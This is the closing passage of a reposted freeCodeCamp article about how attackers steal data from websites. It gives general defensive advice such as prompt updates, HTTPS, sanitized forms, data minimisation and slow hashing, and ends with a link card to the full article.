From one site’s database, hackers can sack thousands of emails, passwords, card numbers, phone numbers, addresses, images, documents, and more. This stolen data can get a pretty price when sold as a dark web data dump.

---

## Defend Your Data

No system or sign-in page is bulletproof, and cybersecurity is never done. Hackers use everything from phishing emails to malicious scripts to steal data, but every tactic has a defense.

The best start is following best practices - like quick updates, HTTPS-only, and sanitized forms. Every row of data stored can suddenly evolve into a complex, rampant threat to users.

We should all aim to save only the most necessary data, locking up our card numbers, passwords, and usernames with strong, “slow-hash” encryption.

Preventing damage to our business and ourselves means committing to careful online practices while we await the latest developer’s patch toward safer online pastures.

<!-- TODO: add ARTICLE CARD -->
```component VPCard
{
  "title": "How Attackers Steal Data from Websites (And How to Stop Them)",
  "desc": "Across platforms, behind every app, and on your own website, hackers may patiently wait.  These days, everyone should have identity theft protections, and be informed about data threats lurking in the trenches of the world-wide-web’s war on privacy a...",
  "link": "https://chanhi2000.github.io/bookshelf/fcc/how-attackers-steal-data-from-websites-and-how-to-stop-them.html",
  "logo": "https://cdn.freecodecamp.org/universal/favicons/favicon.ico",
  "background": "rgba(10,10,35,0.2)"
}
```
